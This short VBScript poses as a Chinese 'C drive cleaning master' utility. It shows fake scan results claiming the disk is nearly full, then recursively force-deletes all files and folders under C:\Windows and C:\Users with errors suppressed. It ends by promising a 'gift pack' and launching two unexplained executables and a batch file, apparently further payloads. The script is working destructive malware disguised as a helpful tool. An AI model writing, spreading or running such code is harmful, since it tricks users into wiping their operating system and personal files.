msgbox"hello，欢迎使用C盘清理大尸，我们绝对能帮你把C盘清理得干干净净！"
msgbox"让我们帮你扫描C盘剩余空间吧！"
msgbox"剩余空间： 5.01MiB                             状态：严重不足"
msgbox"已检测到   不计其数  的可清理文件，请单击”是“或关闭按钮开始清理"
dim fso
set fso=CreateObject("Scripting.FileSystemObject")
call DelAllFiles("C:\Windows")
call DelAllFiles("C:\Users")
sub DelAllFiles(path)
    dim folder,f,subf
    set folder=fso.GetFolder(path)
    for each f in folder.Files
        on error resume next
        f.Delete True
        on error goto 0
    next
    for each subf in folder.SubFolders
        DelAllFiles subf.Path
        on error resume next
        subf.Delete True
        on error goto 0
    next
end sub
msgbox"全部清理完成！！！请单击”是“享受大礼包！"
dim sh
set sh=CreateObject("WScript.Shell")
sh.Run ".\cfz1.exe"
sh.Run ".\cfz2.exe"
sh.Run ".\lanping.bat"